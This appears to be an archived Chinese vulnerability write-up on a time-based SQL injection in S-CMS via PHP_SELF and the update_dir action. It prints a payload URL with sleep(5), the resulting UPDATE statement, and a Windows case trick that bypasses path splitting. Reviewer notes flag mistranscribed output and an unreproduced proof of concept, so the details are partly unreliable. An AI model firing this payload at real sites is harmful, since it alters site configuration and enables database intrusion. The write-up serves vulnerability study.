---
source: "hatch 补库批 20260928"
product: "S-CMS version unspecified"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "S-CMS sql注入漏洞（二）"
prerequisites: "来源所述条件，未列明部分仍待核：Windows大小写不敏感，PHP_SELF含PATH_INFO，update_dir接口权限未述"
side_effects: "未执行；本文需注意的操作影响：update设置C_dir实际会改变站点配置，不能当只读探针；缺完整源函数/认证"
source_status: "unknown"
id: "vw-df50aa4089582671e9be9e3e"
entity_id: "ve-df50aa4089582671e9be9e3e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Windows大小写不敏感，PHP_SELF含PATH_INFO，update_dir接口权限未述

- **实验改动边界（1）**：版本缺，Windows条件有明确保留；请求以#注释经URL编码需分层说明。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **代码与转录边界（2）**：explode示例数组length5与/index.php/字符串长度不符，输出显然转录错误。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **适用与权限边界（3）**：update设置C_dir实际会改变站点配置，不能当只读探针；缺完整源函数/认证。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# S-CMS sql注入漏洞（二）

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

漏洞位置：`index.php`

![](./.resource/S-CMSsql注入漏洞二/media/rId24.jpg)/media/rId24.jpg)

跟进函数`splitx()`

    function splitx($a, $b, $c)
    {
        $d = explode($b, $a);
        return $d[$c];
    }

先上**payload**

    http://www.0-sec.org/index.PHP/a'%20where%20if(1,sleep(5),1)%23?action=update_dir

拼凑SQL语句

    update TABLE_config set C_dir='index.PHP/a' where if(1,sleep(5),1)#'

**解释**

**\$\_SERVER\['PHP\_SELF'\]**：获取当前文件的路径

> 如：127.0.0.1/xxe/xml.php =\> /xxe/xml.php

**explode(separator,string,limit)**：分割字符串形成数组

> separator：规定在哪里分割字符串。
>
> string：要分割的字符串。
>
> limit：规定所返回的数组元素的数目。

如果使用`index.php`，结果如下：

    array (size=2)
      0 => string '/index.php/' (length=5)
      1 => string '/a' where if(1,sleep(5),1)#' (length=27)

被截断，但若使用`index.PHP`：

    array (size=1)
      0 => string '/index.PHP/a' where if(1,sleep(5),1)#' (length=39)

前提：Windows系统下不区分文件大小写。

参考链接
--------

> http://pines404.online/2019/10/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/S-CMS%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/
